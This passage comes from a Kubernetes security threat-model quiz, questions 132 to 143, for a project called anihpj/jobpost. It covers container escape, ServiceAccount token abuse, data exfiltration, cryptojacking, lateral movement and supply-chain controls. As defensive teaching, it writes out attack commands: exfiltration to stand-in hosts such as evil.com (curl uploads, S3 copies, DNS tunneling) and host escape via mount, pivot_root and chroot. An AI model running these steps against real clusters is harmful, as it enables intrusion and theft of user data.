  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  IF A PRIVILEGED POD IS COMPROMISED:                             │
  │  mount /dev/sda1 /mnt && chroot /mnt  → ROOT ON HOST             │
  │  TOTAL TIME TO HOST ROOT: ~5 seconds                             │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: NO application pod runs as privileged. Pod Security Standards (Restricted) explicitly block privileged mode. The only privileged pods in the entire cluster are the Calico CNI DaemonSet and the EBS CSI Driver DaemonSet — both in kube-system, both with strict RBAC, both monitored by Falco for unexpected behavior.

Threat Model Q132 of 200
What is CAP_SYS_ADMIN and why is it called the "new root"?
A) It's a Kubernetes RBAC role that grants admin access to all namespaces
B) It's a deprecated capability that no longer exists in modern kernels
C) CAP_SYS_ADMIN is a catch-all Linux capability that allows ~50 privileged operations: mount/unmount, swapon/swapoff, sethostname, pivot_root, namespace creation, and many more. In a container, CAP_SYS_ADMIN ALONE (without --privileged) is sufficient for most container escape techniques. NEVER give it to application containers
D) It's the default capability for all containers — necessary for basic operation
✅ Correct Answer: C

CAP_SYS_ADMIN is the most dangerous individual capability — it's a "super-capability" that enables multiple container escape paths. With just CAP_SYS_ADMIN (not even --privileged!), an attacker can: mount filesystems (including host filesystems via device access), create new namespaces (and escape existing ones), perform pivot_root (change the container's root filesystem to the host's), modify kernel parameters, and more. If a workload "needs" CAP_SYS_ADMIN, the answer is almost always: redesign the workload, don't grant the capability.

📝 Detailed Explanation
CAP_SYS_ADMIN — The "New Root" Capability
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  CAP_SYS_ADMIN grants (partial list):                            │
  │                                                                  │
  │  mount()         → Mount host filesystem devices                 │
  │  umount()        → Unmount filesystems                          │
  │  pivot_root()    → Change container's root to host's root        │
  │  swapon/swapoff  → Modify swap configuration                    │
  │  sethostname()   → Change hostname of the node (!)              │
  │  clone() with    → Create new namespaces → escape existing      │
  │    CLONE_NEWNS   →    namespace constraints                      │
  │  setdomainname() → Change NIS domain name                       │
  │  sysctl() write  → Modify kernel parameters                     │
  │  ...and ~40 more privileged operations                          │
  │                                                                  │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ ESCAPE WITH CAP_SYS_ADMIN (no --privileged needed!):     │   │
  │  │                                                          │   │
  │  │ 1. Mount host device: mount /dev/sda1 /tmp/host          │   │
  │  │ 2. pivot_root /tmp/host /tmp/host/.pivot                 │   │
  │  │ 3. chroot /tmp/host  → You're now on the HOST filesystem│   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Pod Security Standards (Restricted) explicitly require dropping ALL capabilities including CAP_SYS_ADMIN. If any container's securityContext includes CAP_SYS_ADMIN (even as an "add"), the admission controller rejects it. The only exception is the kube-system namespace for infrastructure pods — and those have compensating controls (readOnlyRootFS, seccomp profiles, Falco monitoring).

Threat Model Q133 of 200
How can an attacker use a compromised ServiceAccount token?
A) ServiceAccount tokens are read-only — attackers can't do anything with them
B) They can only view pod logs — tokens don't grant any dangerous access
C) Tokens expire after 1 minute — they're useless for attackers
D) The token at /var/run/secrets/kubernetes.io/serviceaccount/token allows authentication to the K8s API. What the attacker can DO depends on RBAC. If the SA has cluster-admin: GAME OVER — create privileged pods, read all secrets, delete everything. If the SA has minimal RBAC (only get pods in one namespace): limited to pod discovery. This is WHY least privilege RBAC per SA is critical
✅ Correct Answer: D

The ServiceAccount token is the keys to the Kubernetes API. Every pod that mounts a SA token can authenticate to the API server. The token's POWER is determined entirely by the RBAC bindings for that ServiceAccount. If the SA has cluster-admin: the attacker can create privileged pods on any node, read all Secrets (including other applications'), delete any resource, and impersonate any user. If the SA has NO RBAC permissions (only the default discovery role): the attacker can only discover API endpoints — no reads, writes, or deletes. The difference is RBAC configuration.

📝 Detailed Explanation
SA Token Power — It Depends on RBAC
  ┌──────────────────────────────────────────────────────────────────┐
  │  SAME TOKEN, DIFFERENT RBAC → DIFFERENT BLAST RADIUS:           │
  │                                                                  │
  │  ┌─────────────────────────┐    ┌─────────────────────────┐     │
  │  │ SA: anihpj-api (BAD)    │    │ SA: anihpj-api (GOOD)   │     │
  │  │ RoleBinding: cluster-   │    │ RoleBinding: pod-reader │     │
  │  │   admin ClusterRole     │    │   in anihpj namespace   │     │
  │  ├─────────────────────────┤    ├─────────────────────────┤     │
  │  │ ✅ kubectl get secrets  │    │ ✅ kubectl get pods     │     │
  │  │    -A (read ALL secrets)│    │    -n anihpj (see names)│     │
  │  │ ✅ kubectl create -f   │    │ ❌ kubectl get secrets  │     │
  │  │    backdoor-pod.yaml    │    │    (FORBIDDEN)          │     │
  │  │ ✅ kubectl delete pods │    │ ❌ kubectl create -f    │     │
  │  │    -A (destroy cluster) │    │    (FORBIDDEN)          │     │
  │  │ ✅ kubectl exec into   │    │ ❌ kubectl exec         │     │
  │  │    any pod              │    │    (FORBIDDEN)          │     │
  │  │                         │    │                         │     │
  │  │ BLAST RADIUS: 💥 ENTIRE│    │ BLAST RADIUS: 🎯 pod    │     │
  │  │              CLUSTER    │    │              names only │     │
  │  └─────────────────────────┘    └─────────────────────────┘     │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The anihpj-api pod's ServiceAccount has automountServiceAccountToken: false — no K8s API access AT ALL. Even with RCE in the API container, the attacker cannot call kubectl, list pods, read secrets, or deploy backdoors. The only attack path is application-level: network connections to db:5432 and redis:6379 (which NetworkPolicy allows but application authentication protects).

Threat Model Q134 of 200
What methods can an attacker use to exfiltrate data from a compromised pod?
A) ① HTTPS to external server (curl -X POST https://evil.com/upload -d @data), ② DNS tunneling (encode data chunks as subdomains of attacker-controlled domain), ③ Cloud storage API (aws s3 cp data s3://evil-bucket/), ④ Steganography in logs (embed data in log messages picked up by log aggregator). Each requires different defenses: egress NP, DNS inspection, restrictive IAM, log anomaly detection
B) Data exfiltration is impossible from Kubernetes — all traffic is encrypted
C) The only way is physical access to the server — remote exfiltration doesn't work
D) Attackers can only exfiltrate data through kubectl cp commands
✅ Correct Answer: A

Attackers have multiple creative exfiltration channels. HTTPS is the most common (blends in with normal web traffic) — blocked by egress NetworkPolicy. DNS tunneling is sneaky — encodes data in DNS query subdomains, exploiting the fact that DNS (UDP 53) is almost always allowed. Cloud storage API works if the pod has cloud IAM credentials (from IRSA or metadata). Log-based exfiltration is slow but hard to detect — data hidden in log messages flowing through your log pipeline.

📝 Detailed Explanation
Four Exfiltration Channels — Defenses
  ┌──────────────────────────────────────────────────────────────────┐
  │ CHANNEL          │ HOW IT WORKS               │ DEFENSE         │
  ├──────────────────────────────────────────────────────────────────┤
  │ ① HTTPS          │ curl -X POST              │ Egress NP:      │
  │    (most common) │   https://evil.com/upload  │ deny all → allow│
  │                  │   -d @stolen_data.json     │ only DNS + API  │
  ├──────────────────────────────────────────────────────────────────┤
  │ ② DNS Tunneling  │ Encode data as:           │ DNS inspection: │
  │    (sneaky)      │ base64(data).evil.com     │ monitor query   │
  │                  │ Chunk1.evil.com           │ length (tunneled│
  │                  │ Reassembled at attacker's │ queries > 200B) │
  │                  │ DNS server                │ CoreDNS logging │
  ├──────────────────────────────────────────────────────────────────┤
  │ ③ Cloud Storage  │ aws s3 cp data.txt \     │ Restrictive IAM │
  │    API           │   s3://attacker-bucket/   │ (no S3 write)   │
  │                  │ gcloud storage cp ...     │ NP blocks cloud │
  │                  │                           │ API endpoints   │
  ├──────────────────────────────────────────────────────────────────┤
  │ ④ Log Steganog.  │ logger "INFO: user       │ Log format      │
  │    (slow)        │   session_abc123..."      │ validation,     │
  │                  │ (data hidden in "session")│ anomaly detection│
  │                  │ Exfiltrated via log agg   │ on log volume   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Egress NetworkPolicy blocks all outbound traffic except DNS (UDP 53 to CoreDNS) and the API's upstream dependencies (db:5432, redis:6379). Even if an attacker gets RCE, they can't reach the internet — no HTTPS, no external DNS servers, no cloud APIs. DNS tunneling is prevented because pods can only query CoreDNS (not external nameservers directly). Log format validation rejects unusually structured log messages.

Threat Model Q135 of 200
What is a cryptojacking attack in Kubernetes?
A) An attacker encrypts your Kubernetes data and demands cryptocurrency ransom
B) Attacker deploys cryptocurrency miners inside your cluster, using YOUR compute (CPU/GPU) and YOUR electricity to mine cryptocurrency for THEM. You pay the cloud bill; they get the crypto. Detection: sudden sustained high CPU usage, unexpected processes (Falco), unusual outbound connections to mining pools, and cloud bill anomalies
C) A Kubernetes feature that lets you mine cryptocurrency for passive income
D) An attack that only affects cryptocurrency exchanges — not regular applications
✅ Correct Answer: B

Cryptojacking is resource theft — the attacker uses YOUR infrastructure to generate cryptocurrency for themselves. In Kubernetes, this typically happens via: exposed dashboard (attacker deploys mining pods), compromised image (miner included in the image), or CI/CD pipeline compromise (miner injected during build). Tesla famously fell victim in 2018 — an unsecured Kubernetes dashboard allowed attackers to deploy crypto miners that ran undetected, using Tesla's AWS resources. The attack is financially motivated and often designed to be stealthy (miners run at low priority to avoid detection).

📝 Detailed Explanation
Cryptojacking — Stealthy Resource Theft
  ┌──────────────────────────────────────────────────────────────────┐
  │  ATTACK:                                                         │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ 1. Attacker finds exposed K8s dashboard (no auth)        │   │
  │  │ 2. Deploys "innocent-looking" pod:                       │   │
  │  │    image: monero-miner:latest                            │   │
  │  │    resources:                                            │   │
  │  │      limits:                                            │   │
  │  │        cpu: 500m    ← Only 0.5 core — hard to notice     │   │
  │  │    (Attacker deploys 20 such pods across cluster)       │   │
  │  │ 3. Each pod connects to mining pool → mines Monero       │   │
  │  │ 4. Total: 10 CPU cores stolen 24/7                       │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  DETECTION SIGNALS:                                              │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ 📊 CPU: Suddenly 100% on previously idle nodes           │   │
  │  │ 📊 Cloud Bill: $500/day → $5000/day (10x increase)      │   │
  │  │ 🛡️ Falco: Process "xmrig" started in unknown pod         │   │
  │  │ 🌐 Network: Connections to mining pool IPs (port 3333)   │   │
  │  │ 📋 Audit: Unauthorized pod creation in default namespace │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The Kubernetes dashboard is NOT installed (attackers can't use that vector). All images are signed (Cosign) and scanned (Trivy). Falco rules detect cryptocurrency mining processes (xmrig, xmr-stak, cpuminer). ResourceQuota limits total CPU per namespace. Cloud bill anomaly alerts trigger at 50% increase. Pod Security Admission blocks pods without proper labels (miners typically lack app/team labels).

Threat Model Q136 of 200
What is "lateral movement" in a Kubernetes cluster?
A) Moving pods between nodes using kubectl drain and cordon
B) The scheduler moving pods to different nodes for load balancing
C) When an attacker, having compromised ONE pod, uses that foothold to access OTHER resources. Example: compromise anihpj-web → use SA token to list all pods → discover anihpj-db → connect to PostgreSQL:5432 → dump all user data. NetworkPolicy + RBAC are your PRIMARY lateral movement defenses
D) Replicating a Deployment across multiple availability zones
✅ Correct Answer: C

Lateral movement is how attackers expand from an initial foothold to more valuable targets. In Kubernetes: compromise a low-value pod (e.g., a public-facing web server) → use its network access and credentials to reach higher-value targets (databases, internal APIs, other namespaces). Without NetworkPolicy, the web pod can reach ANY pod in the cluster. Without RBAC, the SA token can list/access resources across namespaces. Your goal: make lateral movement impossible by restricting both network paths AND API permissions to the absolute minimum needed.

📝 Detailed Explanation
Lateral Movement — Attack Path Example
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ① INITIAL COMPROMISE:                                           │
  │     Attacker exploits XSS in anihpj-web (public-facing)          │
  │     → Gets RCE in the web container                              │
  │                                                                  │
  │  ② DISCOVERY (with SA token):                                   │
  │     curl https://kubernetes.default/api/v1/namespaces/anihpj/pods│
  │     → Lists: anihpj-web, anihpj-api, anihpj-db, anihpj-redis    │
  │     → "Interesting: anihpj-db is PostgreSQL"                     │
  │                                                                  │
  │  ③ LATERAL MOVEMENT (without NetworkPolicy):                     │
  │     psql -h anihpj-db -U postgres -d jobpost                     │
  │     → Connected! (because no NetworkPolicy blocks web→db         │
  │        even though the web pod should NEVER talk to the DB)      │
  │                                                                  │
  │  ④ DATA ACCESS + EXFILTRATION:                                   │
  │     SELECT * FROM users; → All user PII                          │
  │     curl https://evil.com/upload -d @users.json                  │
  │                                                                  │
  │  ─── WITH DEFENSES ───                                          │
  │  ② DISCOVERY: SA token has NO API access → 403 Forbidden        │
  │  ③ LATERAL: NetworkPolicy blocks web→db → Connection REFUSED     │
  │  ④ EXFIL: Egress NP blocks internet → curl TIMEOUT              │
  │                                                                  │
  │  RESULT WITHOUT DEFENSES: Total data breach                      │
  │  RESULT WITH DEFENSES: Attacker stuck in web pod, can't move     │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The tiered NetworkPolicy design explicitly prevents lateral movement: web→api:8000 (not web→db:5432!), api→db:5432, api→redis:6379. Even if web is compromised, it can only reach the API — it must exploit the API's application logic to reach the database. The web pod's SA has no K8s API access (automountServiceAccountToken: false) — discovery via kubectl API is impossible. Every tier is a gate that the attacker must independently defeat.

4.5 Attacker on the NetworkQ137–Q141

Threat Model Q137 of 200
How does image signing (Cosign/Sigstore) prevent supply chain attacks?
A) Developer builds image → Cosign signs it with their OIDC identity (keyless — no long-lived keys!), signature stored in registry, Rekor transparency log records the signature (public, immutable). Before deployment: admission controller verifies the signature against trusted identities in Rekor. If signature missing or invalid → image REJECTED. This creates an auditable chain of custody: who built what, when
B) Image signing encrypts the container image so attackers can't read it
C) Cosign scans the image for CVEs — it's the same as Trivy
D) Image signing is only for compliance — it doesn't actually prevent attacks
✅ Correct Answer: A

Cosign/Sigstore provides cryptographic proof of origin. When a developer builds and pushes an image, Cosign creates a digital signature tied to their identity (via OIDC — no long-lived keys to manage or steal). The signature is stored in the registry and recorded in the Rekor transparency log (a public, append-only, immutable ledger). Before deployment, an admission controller (e.g., Kyverno or Connaisseur) verifies: "Is this image signed by someone we trust? Is the signature in Rekor?" This prevents attackers from injecting malicious images into the pipeline — they can't forge a valid signature from a trusted identity.

📝 Detailed Explanation
Cosign Keyless Signing — Identity-Based Trust
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  SIGNING (at build time):                                        │
  │  ┌─────────┐     ┌────────┐     ┌──────────┐     ┌──────────┐  │
  │  │Developer│────►│ OIDC   │────►│  Fulcio  │────►│  Cosign  │  │
  │  │ builds  │     │ IdP    │     │   CA     │     │  signs   │  │
  │  │ image   │     │(GitHub)│     │(Sigstore)│     │  image   │  │
  │  └─────────┘     └────────┘     └──────────┘     └────┬─────┘  │
  │                                                       │         │
  │  ┌────────────────────────────────────────────────────┘         │
  │  │                                                              │
  │  ▼                                                              │
  │  ┌──────────┐     ┌──────────────────────────────────────┐     │
  │  │ Registry │     │  Rekor Transparency Log              │     │
  │  │ image +  │     │  "alice@corp.com signed              │     │
  │  │ signature│     │   anihpj-api@sha256:abc...           │     │
  │  └──────────┘     │   at 2026-06-12T10:30:00Z"          │     │
  │                   │   (immutable, public record)          │     │
  │                   └──────────────────────────────────────┘     │
  │                                                                  │
  │  VERIFICATION (at deploy time):                                  │
  │  ┌────────────────┐                                             │
  │  │ Admission Ctrl │                                             │
  │  │ 1. Check: image has signature?                               │
  │  │ 2. Check: signer identity in allowed list?                   │
  │  │ 3. Check: signature in Rekor log?                            │
  │  │ 4. ALL PASS → deploy ✓                                      │
  │  │    ANY FAIL → REJECT ✗                                       │
  │  └────────────────┘                                             │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Every CI/CD pipeline run signs the built image with Cosign using the developer's GitHub identity (keyless). The Kyverno ClusterImagePolicy in the cluster verifies: the image must be signed by an identity in the "anihpj-corp" GitHub org AND the signature must exist in the Rekor transparency log. An attacker who pushes a malicious "anihpj-api:v2" image can't sign it as @anihpj-corp — the admission controller rejects it. Supply chain attack: blocked.

Threat Model Q138 of 200
What is an SBOM (Software Bill of Materials) and why does it matter for security?
A) SBOM is a licensing document — it only tracks open-source license compliance
B) An SBOM is a machine-readable inventory of EVERY component in your software: packages, libraries, versions, licenses, and their transitive dependencies. Formats: SPDX, CycloneDX, Syft JSON. Critical value: when Log4Shell (CVE-2021-44228) hits, query your SBOM database — "Which images contain log4j-core ≤ 2.14.1?" — instant answer vs checking every image manually for weeks
C) SBOM is only required for government software — commercial apps don't need it
D) SBOM replaces the need for image scanning entirely
✅ Correct Answer: B

An SBOM is your software's "ingredients list." When a critical CVE is announced (like Log4Shell in December 2021), organizations without SBOMs spent WEEKS manually checking every container image for the vulnerable library. Those with SBOMs ran a single query: "Find all images where SBOM contains log4j-core version ≤ 2.16.0" → instant results → patched within hours. SBOMs are becoming mandatory: US Executive Order 14028 requires them for federal software suppliers. Standards: SPDX (Linux Foundation), CycloneDX (OWASP).

📝 Detailed Explanation
SBOM — Your Software's Ingredients List
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  WITHOUT SBOM (Log4Shell scenario):                              │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ "Does anihpj-api use Log4j?"                              │   │
  │  │ 1. Check Dockerfile → doesn't list Log4j directly        │   │
  │  │ 2. Check requirements.txt → doesn't list Log4j           │   │
  │  │ 3. Spin up container, check installed packages...        │   │
  │  │ 4. Wait — is it a transitive dependency of something?    │   │
  │  │ 5. Manually crawl dependency tree...                     │   │
  │  │    TIME: DAYS to WEEKS across all images                 │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  WITH SBOM (Syft generates at build):                            │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ $ syft anihpj-api:latest -o spdx-json > sbom.json        │   │
  │  │ $ jq '.packages[] | select(.name | test("log4j"))'       │   │
  │  │   sbom.json                                              │   │
  │  │ → org.apache.logging.log4j:log4j-core@2.14.1             │   │
  │  │ → FOUND: anihpj-api IS affected by Log4Shell!            │   │
  │  │    TIME: 30 seconds                                      │   │
  │  └──────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Every CI/CD pipeline run generates an SBOM with Syft and uploads it to Dependency-Track (OWASP's SBOM management platform). The SBOM is attached to the container image as an OCI artifact. When CVEs are announced, the security team queries Dependency-Track: "Show all projects affected by CVE-2024-XXXXX" → instant list of affected images → prioritized patching. SBOM generation is a non-negotiable step in the pipeline.

Threat Model Q139 of 200
What are SLSA levels and what do they mean for supply chain security?
A) SLSA is an alternative to Kubernetes RBAC for authorization
B) SLSA levels 1-4 measure how fast your CI/CD pipeline runs
C) SLSA only applies to Java applications — not relevant for Python/Go
D) SLSA (Supply Chain Levels for Software Artifacts): L0 = no guarantees, L1 = build is automated/scripted with provenance, L2 = versioned + hosted build service with signed provenance, L3 = auditable source + build platforms with isolated builds + non-falsifiable provenance, L4 = two-person review + hermetic builds (all deps declared). Most orgs target L2-L3; L4 is for critical infrastructure
✅ Correct Answer: D

SLSA (pronounced "salsa") is Google's framework for measuring supply chain integrity. It defines 4 levels of increasing trustworthiness. Level 1: you have an automated build (not "Bob built it on his laptop"). Level 2: you use a hosted CI/CD service that generates signed provenance. Level 3: your source and build platforms meet auditability standards, builds are isolated (no shared build machines). Level 4: two-person review of all changes + hermetic builds (all dependencies explicitly declared, no network during build). Higher levels = stronger guarantees that the artifact hasn't been tampered with.

📝 Detailed Explanation
SLSA Levels — Progressive Trust
  ┌──────────────────────────────────────────────────────────────────┐
  │ LEVEL │ REQUIREMENTS                        │ GUARANTEE          │
  ├──────────────────────────────────────────────────────────────────┤
  │   0   │ Nothing                             │ No guarantees      │
  │       │                                     │ "Trust me bro"     │
  ├──────────────────────────────────────────────────────────────────┤
  │   1   │ Build is SCRIPTED (automated)       │ You can see the    │
  │       │ Provenance shows source + command   │ build instructions │
  ├──────────────────────────────────────────────────────────────────┤
  │   2   │ Build is VERSIONED + uses HOSTED    │ Signed provenance  │
  │       │ build service (GitHub Actions,etc)  │ from trusted       │
  │       │ Build service generates provenance  │ service            │
  ├──────────────────────────────────────────────────────────────────┤
  │   3   │ Source + build platforms are        │ Non-falsifiable    │
  │       │ AUDITABLE. Builds are ISOLATED       │ provenance —       │
  │       │ (no shared build machines)          │ can't fake who     │
  │       │                                     │ built what         │
  ├──────────────────────────────────────────────────────────────────┤
  │   4   │ TWO-PERSON REVIEW of all changes    │ Maximum assurance  │
  │       │ HERMETIC builds (all deps declared, │ — every step       │
  │       │ no network during build)            │ independently      │
  │       │                                     │ verified           │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The CI/CD pipeline achieves SLSA Level 2+ today: GitHub Actions (hosted build service, signed provenance), build steps are versioned in the repository, and provenance is attached to every image. The roadmap targets SLSA Level 3: isolated build runners (not shared with other projects) and build platform auditability. Level 4 would require two-person code review (already done) + hermetic builds with fully declared dependencies (in progress).

Threat Model Q140 of 200
For anihpj/jobpost, what's a practical end-to-end supply chain security strategy?
A) ① Pin base images by SHA256 digest (not tags — tags are mutable), ② Multi-stage Docker build → distroless runtime (no shell, no pkg mgr), ③ CI/CD: Trivy scan → fail on CRITICAL/HIGH CVEs → Cosign keyless sign → push to private registry → SBOM upload, ④ Deploy: admission controller verifies Cosign signature + registry allowlist → deploy, ⑤ Runtime: Falco monitors for unexpected behavior. Defense at every stage of the artifact lifecycle
B) Use :latest tag for all images — it's always the most up-to-date
C) Supply chain security is the cloud provider's responsibility — no action needed
D) Just scan images once before the first deployment — no need for ongoing verification
✅ Correct Answer: A

A complete supply chain strategy covers the full artifact lifecycle: build → scan → sign → store → deploy → runtime. Each stage has a specific control. Build: pin digests (not tags — :latest today ≠ :latest tomorrow), multi-stage builds, distroless base. Scan: Trivy in CI/CD, fail on CRITICAL/HIGH CVEs. Sign: Cosign keyless (OIDC-based). Store: private registry, tag immutability. Deploy: admission controller verifies signature + allowed registry. Runtime: Falco detects anomalous behavior. No single control is enough — each validates a different property of the artifact.

📝 Detailed Explanation
Supply Chain Security — Full Lifecycle
  ┌──────────────────────────────────────────────────────────────────────┐
  │                                                                      │
  │  BUILD ──────► SCAN ──────► SIGN ──────► STORE ──────► DEPLOY ──► RUN│
  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐   │
  │  │Pin digest│ │Trivy scan│ │Cosign    │ │Private   │ │Admission │   │
  │  │Multi-stg │ │Fail on   │ │keyless   │ │registry  │ │verifies: │   │
  │  │distroless│ │CRIT/HIGH │ │OIDC sign │ │immutable │ │• Signed? │   │
  │  │USER 1000│ │Generate  │ │Attach SBOM│ │tags      │ │•Allowed? │   │
  │  │          │ │SBOM (Syft)│ │          │ │          │ │•No CVEs?│   │
  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘   │
  │                                                                      │
  │  ┌──────────────────────────────────────────────────────────────┐   │
  │  │ RUNTIME: Falco monitors for:                                  │   │
  │  │ • Unexpected processes (shell in distroless container!)       │   │
  │  │ • Unexpected outbound connections (C2 callback)               │   │
  │  │ • File writes to read-only filesystem (attempted malware)     │   │
  │  │ • Privilege escalation attempts                               │   │
  │  └──────────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: This exact pipeline runs on every commit to main. A PR that updates requirements.txt triggers: build → Trivy scan → Cosign sign → push to ECR → SBOM to Dependency-Track → ArgoCD syncs → Kyverno verifies signature → pod starts → Falco watches. If ANY step fails (Trivy finds CRITICAL CVE, Cosign can't verify identity, Kyverno rejects), the deployment is BLOCKED and the PR is marked as failed.

Threat Model Q141 of 200
What is DNS tunneling and why is it hard to detect?
A) DNS tunneling is when attackers physically dig tunnels to access DNS servers
B) It's a Kubernetes feature for faster DNS resolution — not a security concern
C) DNS tunneling encodes stolen data in DNS queries. Pod queries base64-encoded-data.evil.com → CoreDNS forwards → attacker's nameserver reassembles data. Hard to detect because: ① DNS is almost always allowed (pods need DNS), ② looks like normal DNS traffic at L3/L4, ③ attackers can chunk data into small queries (stay under size thresholds). Defense: DNS-layer inspection, CoreDNS logging, anomaly detection on query patterns
D) DNS tunneling only works on Windows — Linux DNS is immune
✅ Correct Answer: C

DNS tunneling exploits the fact that DNS traffic is almost never blocked — pods need DNS to function. Attackers encode data as subdomains of a domain they control. For example: base64-encoded-chunk1.evil.com → CoreDNS forwards the query upstream → attacker's DNS server receives the "subdomain" → extracts the base64 chunk → reassembles the stolen data. It's hard to detect because it uses the standard DNS protocol on port 53, which is allowed by almost every firewall. Detection requires DNS-layer inspection (look for unusual query lengths, high entropy subdomains, or high query frequency to a single domain).

📝 Detailed Explanation
DNS Tunneling — Data Exfiltration via DNS
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  COMPROMISED POD               ATTACKER'S INFRASTRUCTURE         │
  │  ┌──────────────────┐          ┌──────────────────────────┐     │
  │  │ Stolen data:     │          │ evil.com DNS server      │     │
  │  │ users.json (50KB)│          │ (attacker-controlled)    │     │
  │  │                  │          │                          │     │
  │  │ 1. Base64 encode │          │ Receives queries:        │     │
  │  │ 2. Chunk (200B)  │          │ • Chunk1.evil.com        │     │
  │  │ 3. DNS queries:  │──DNS──►  │ • Chunk2.evil.com        │     │
  │  │    Chunk1.evil   │  UDP 53  │ • Chunk3.evil.com        │     │
  │  │    Chunk2.evil   │          │                          │     │
  │  │    ...250 chunks │          │ 4. Reassemble:           │     │
  │  │                  │          │    base64→JSON            │     │
  │  │  TOTAL: ~250     │          │    → All user PII!       │     │
  │  │  DNS queries     │          └──────────────────────────┘     │
  │  └──────────────────┘                                           │
  │                                                                  │
  │  DETECTION:                                                      │
  │  • DNS query length: normal = 50-150 bytes; tunneled = 200+ bytes│
  │  • Query entropy: base64 has high randomness (unlike normal DNS)│
  │  • Query frequency: 250 queries in 2 seconds = anomaly          │
  │  • Subdomain depth: normal = 2-3 labels; tunneled = long strings│
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Egress NetworkPolicy restricts pods to DNS queries ONLY to CoreDNS (not external DNS servers). CoreDNS forwards to the upstream resolver, but the pod can't send DNS directly to attacker-controlled servers. CoreDNS query logs are monitored for anomalous patterns (unusually long query names, high entropy, or high frequency to unknown domains). Combined with egress deny-all, even DNS tunneling is extremely difficult — the pod can only make DNS queries through the approved CoreDNS path, which is monitored.

4.6 Access to Sensitive DataQ142–Q145

Threat Model Q142 of 200
What is "keyless signing" with Cosign and why is it more secure than traditional key-based signing?
A) Keyless signing means no signature is created — it's just a label on the image
B) Traditional signing: generate a private key → store it securely FOREVER → sign with it → if key is stolen, ALL signatures are compromised (key management is HARD). Keyless: use OIDC to prove identity to Fulcio (Sigstore CA) → Fulcio issues a SHORT-LIVED certificate (10 minutes!) → sign with this temp cert → no long-lived keys to manage, steal, or lose. Rekor log provides proof of signing event
C) Keyless signing uses a hardware security module (HSM) — software keys are "keyless"
D) Keyless signing is less secure because there's no key to verify
✅ Correct Answer: B

Keyless signing solves the hardest problem in cryptography: key management. Traditional signing requires generating a private key, storing it securely forever, distributing the public key to verifiers, and rotating keys if compromised. If the private key is stolen, all past and future signatures are suspect. Keyless signing eliminates long-lived keys entirely: the developer authenticates via OIDC (e.g., GitHub SSO), Fulcio (Sigstore's certificate authority) issues a short-lived X.509 certificate (valid only 10 minutes), and that temp cert signs the image. The signing event is recorded in the Rekor transparency log — an immutable, publicly verifiable record.

📝 Detailed Explanation
Traditional vs Keyless Signing
  ┌──────────────────────────────────────────────────────────────────┐
  │  TRADITIONAL (KEY-BASED):              KEYLESS (OIDC-BASED):     │
  │  ┌────────────────────┐               ┌────────────────────┐    │
  │  │ Generate keypair   │               │ Developer logs in  │    │
  │  │ (cosign generate)  │               │ via GitHub OIDC    │    │
  │  │ Store private key  │               │                    │    │
  │  │ (where? how safe?) │               │ Fulcio CA verifies │    │
  │  │ Distribute public  │               │ identity → issues  │    │
  │  │ key to verifiers   │               │ 10-min certificate │    │
  │  │ Sign image with    │               │                    │    │
  │  │ private key        │               │ Sign with temp cert│    │
  │  │                    │               │ (cert auto-expires) │    │
  │  │ ⚠️ Key stolen? →  │               │                    │    │
  │  │ ALL signatures     │               │ ✅ No key to steal │    │
  │  │ compromised!       │               │ (cert expired in   │    │
  │  │                    │               │  10 min anyway!)   │    │
  │  │ ⚠️ Key lost? →    │               │                    │    │
  │  │ Can't sign anymore │               │ ✅ No key to lose  │    │
  │  └────────────────────┘               └────────────────────┘    │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: All developers sign images using Cosign keyless — their GitHub identity is the root of trust. The Kyverno policy verifies that the signer's identity matches the pattern *@anihpj-corp.com or is a member of the anihjp-corp GitHub organization. No private keys to distribute, rotate, or protect. If a developer leaves the company, removing them from the GitHub org automatically revokes their ability to create valid signatures.

Threat Model Q143 of 200
How do you prevent pulling images from untrusted registries?
A) This isn't possible — Kubernetes pulls from any registry by default
B) Rename your registry to something only your team knows
C) Just tell developers not to use untrusted registries — policy is enough
D) ① OPA/Gatekeeper or Kyverno policy: validate all image references match allowed registries (e.g., only *.ecr.aws.amazon.com, anihpj.io/*), ② ImagePolicyWebhook (built-in admission): API server calls external webhook for every image, ③ NetworkPolicy egress: restrict pods from reaching unapproved registries (defense-in-depth)
✅ Correct Answer: D

Registry allowlisting is a critical supply chain control. Without it, any developer (or attacker with compromised credentials) can deploy images from any registry — including malicious images from Docker Hub that impersonate your applications. The primary mechanism is an admission controller policy (OPA/Gatekeeper Rego rule or Kyverno ClusterPolicy) that validates image fields against an approved list. Defense-in-depth: also restrict egress NetworkPolicy to block pods from reaching unapproved registries at the network level — even if admission control fails, the pod can't pull from an untrusted source.

📝 Detailed Explanation
Registry Allowlisting — Three-Layer Defense
